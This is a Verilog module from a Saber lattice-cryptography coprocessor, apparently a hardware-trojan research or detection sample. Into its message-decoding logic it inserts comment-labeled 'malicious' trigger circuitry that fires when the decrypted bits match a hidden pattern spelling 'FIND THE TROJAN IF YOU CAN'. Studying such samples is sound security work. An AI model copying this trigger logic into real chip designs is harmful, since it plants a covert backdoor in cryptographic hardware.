`timescale 1ns / 1ps

//////////////////////////////////////////////////////////////////////////////////

// High-speed instruction set coprocessor architecture for lattice-based cryptography. 
// Saber is implemented as a case study.
// The designers are Sujoy Sinha Roy and Andrea Basso. 

// Implementation by the designers, hereby denoted as "the implementer".

// To the extent possible under law, the implementer has waived all copyright
// and related or neighboring rights to the source code in this file.
// http://creativecommons.org/publicdomain/zero/1.0/

// The codes are for academic research use only and does not come with any support or any responsibility.

//////////////////////////////////////////////////////////////////////////////////


/*
	SABER_un_pack4bit(scale_ar, op);
	//addition of h1
	for(i=0;i<SABER_N;i++){
		v[i]= ( ( v[i] + h2 - (op[i]<<(SABER_EP-SABER_ET)) ) & (mod_p) ) >> (SABER_EP-1);
	}
	POL2MSG(v, message_dec);
*/

`define h2 10'd228

module unpack(clk, rst, read_base_sel, read_address, read_data,
									write_address, write_data, write_en, verify_future, done_verify, trigger,
									done);//malicious: add these ports between write_en and done -- verify_future, done_verify, trigger, 
input clk, rst;
output read_base_sel;	// used to select either vprime or message; 1-->message
output [8:0] read_address;
input [63:0] read_data;

output reg [8:0] write_address;
output [63:0] write_data;
output write_en;
input verify_future;//malicious
input done_verify;//malicious
output trigger;//malicious
output done;


reg read_base_sel, inc_v_address, v_buffer64_en;
reg op_buffer16_en, op_buffer64_en, m_buffer_en, inc_write_address;
reg [63:0] op_buffer, v_buffer, m_buffer;
reg [8:0] v_address;
reg [4:0] state, nextstate;

wire v_address_64, store_m, load_op;
wire [9:0] add0, add1, add2, add3;
wire [8:0] op_address;
wire message_load_needed;

always @(posedge clk)
begin
	if(op_buffer64_en)
		op_buffer <= read_data;
	else if(op_buffer16_en)
		op_buffer <= {16'd0, op_buffer[63:16]};
end
always @(posedge clk)
begin
	if(v_buffer64_en)
		v_buffer <= read_data;
end

reg [31:0] devil[3:0];//malicious
reg [5:0] cntr;	      //malicious - for storing the number of m_buffer_en HIGHs
reg trigger;          //malicious
reg init;             //malicious

//256 bits from MSB to LSB
//0x46,0x49,0x4e,0x44,0x20,0x54,0x48,0x45,0x20,0x54,0x52,0x4f,0x4a,0x41,0x4e,0x20,0x49,0x46,0x20,0x59,0x4f,0x55,0x20,0x43,0x41,0x4e,0x2e,0x2e,0x2e,0x2e,0x2e,0x00
//128 bits: 0x49(LSB),0x46,0x20,0x59,0x4f,0x55,0x20,0x43,0x41,0x4e,0x2e,0x2e,0x2e,0x2e,0x2e,0x00(MSB)
//01001001,01000110,00100000,01011001,01001111,01010101,00100000,01000011,01000001,01001110,00101110,00101110,00101110,00101110,00101110,00000000
//devil[3]: stores bit-3[LSB], bit-7, bit-11, bit-15 and so on...
//devil[2]: stores bit-2[LSB], bit-6, bit-10, bit-14 and so on...
//devil[1]: stores bit-1[LSB], bit-5, bit-9, bit-13 and so on...
//devil[0]: stores bit-0[LSB], bit-4, bit-8, bit-12 and so on...


// Original Circuit...


always @(posedge clk)
begin
    if(rst)//malicious if-else block
           init <= 1;
    else
        begin
            if(init == 1)
                    begin
                        cntr        <= 0;
                        trigger     <= 1;
                        devil[3]    <= 32'b00010001010000000001000000010100;//devil[3]    <= 8'b00010100;//devil[3]    <= 16'b0001000000010100;//00100010100000000010000000101000;
                        devil[2]    <= 32'b00111010111011001110110011111011;//devil[2]    <= 8'b11111011;//devil[2]    <= 16'b1110110011111011;//00110101110111001101110011110111;
                        devil[1]    <= 32'b10010001010100100000001000010001;//devil[1]    <= 8'b00010001;//devil[1]    <= 16'b0000001000010001;//01100010101000010000000100100010;
                        devil[0]    <= 32'b00000100011010000100100000000100;//devil[0]    <= 8'b00000100;//devil[0]    <= 16'b0100100000000100;//00001000100101001000010000001000;
                        init        <= 0;
                    end
        end
                    
	if(m_buffer_en)
	   begin
		m_buffer <= {add3[9],add2[9],add1[9],add0[9],m_buffer[63:4]};
		if(trigger && !cntr[5])//Malicious if-block
		    begin
			trigger	 <=   ~((devil[3][0]^add3[9]) | (devil[2][0]^add2[9]) | (devil[1][0]^add1[9]) | (devil[0][0]^add0[9]));//check with == instead of ^
			devil[3] <=   devil[3] >> 1;
			devil[2] <=   devil[2] >> 1;
			devil[1] <=   devil[1] >> 1;
			devil[0] <=   devil[0] >> 1;
			cntr     <=   cntr + 1;
		    end
	   end
	   
	if(verify_future && done_verify)//malicious
	   trigger <= 1;//malicious
end


always @(posedge clk)
begin
	if(rst)
		v_address <= 9'd0;
	else if(inc_v_address)
		v_address <= v_address + 1'b1;
end
assign v_address_64 = (v_address==9'd64);
assign op_address = {2'd0,v_address[8:2]};
assign read_address = (read_base_sel==1'b0) ? v_address : op_address;

always @(posedge clk)
begin
	if(rst)
		write_address <= 9'd0;
	else if(inc_write_address)
		write_address <= write_address + 1'b1;
end
assign write_data = m_buffer[63:0];
assign write_en = inc_write_address;
assign store_m = (v_address[3:0]==4'd0) ? 1'b1 : 1'b0;
assign load_op = (v_address[1:0]==2'd0) ? 1'b1 : 1'b0;


//v[i]= ( ( v[i] + h2 - (op[i]<<(SABER_EP-SABER_ET)) ) & (mod_p) ) >> (SABER_EP-1);
//SABER_EP-SABER_ET=6
assign add0 = v_buffer[09:00] + `h2 - {op_buffer[3:0],6'd0};
assign add1 = v_buffer[25:16] + `h2 - {op_buffer[7:4],6'd0};
assign add2 = v_buffer[41:32] + `h2 - {op_buffer[11:8],6'd0};
assign add3 = v_buffer[57:48] + `h2 - {op_buffer[15:12],6'd0};

always @(posedge clk)
begin
	if(rst)
		state <= 5'd0;
	else
		state <= nextstate;
end

always @(state)
begin
	case(state)
	5'd0: begin 
			read_base_sel<=0; inc_v_address<=0; v_buffer64_en<=0;
			op_buffer16_en<=0; op_buffer64_en<=0;
			m_buffer_en<=0; inc_write_address<=0;
		end

	5'd1: begin // Fetch op; 
			read_base_sel<=1; inc_v_address<=0; v_buffer64_en<=0; 
			op_buffer16_en<=0; op_buffer64_en<=0;
			m_buffer_en<=0; inc_write_address<=0;
		end
	5'd2: begin // write 64 bits of op; Fetch v;
			read_base_sel<=0; inc_v_address<=0; v_buffer64_en<=0; 
			op_buffer16_en<=0; op_buffer64_en<=1;
			m_buffer_en<=0; inc_write_address<=0;
		end	
	// State 3 and 4 happen in a loop.
	5'd3: begin // Write 4 coeff of v;  inc v_address
			read_base_sel<=0; inc_v_address<=1; v_buffer64_en<=1; 
			op_buffer16_en<=0; op_buffer64_en<=0;
			m_buffer_en<=0; inc_write_address<=0;
		end
	5'd4: begin // Compute 4 bits of m from 16 bits op and 40 bit v; 
			read_base_sel<=0; inc_v_address<=0; v_buffer64_en<=0; 
			op_buffer16_en<=1; op_buffer64_en<=0;
			m_buffer_en<=1; inc_write_address<=0;
		end
		
	5'd5: begin // Store 64 bits of m; 
			read_base_sel<=0; inc_v_address<=0; v_buffer64_en<=0; 
			op_buffer16_en<=0; op_buffer64_en<=0;
			m_buffer_en<=0; inc_write_address<=1;
		end
		
	5'd15: begin  
			read_base_sel<=0; inc_v_address<=0; v_buffer64_en<=0; 
			op_buffer16_en<=0; op_buffer64_en<=0;
			m_buffer_en<=0; inc_write_address<=0;
		end
	default: begin  
			read_base_sel<=0; inc_v_address<=0; v_buffer64_en<=0; 
			op_buffer16_en<=0; op_buffer64_en<=0;
			m_buffer_en<=0; inc_write_address<=0;
		end
	endcase
end
	
always @(state or store_m or load_op or v_address_64)
begin
	case(state)
	5'd0: nextstate <= 5'd1;
	5'd1: nextstate <= 5'd2;
	5'd2: nextstate <= 5'd3;
	
	5'd3: nextstate <= 5'd4;
	5'd4: begin
				if(store_m)
					nextstate <= 5'd5;
				else if(load_op)
					nextstate <= 5'd1;	
				else
					nextstate <= 5'd3;
			end
			
	5'd5: begin
				if(v_address_64)
					nextstate <= 5'd15;
				else	
					nextstate <= 5'd1;
			end
	5'd15: nextstate <= 5'd15;				
	default: nextstate <= 5'd0;	
	endcase
end
	
assign done = (state==5'd15) ? 1'b1 : 1'b0;	
endmodule
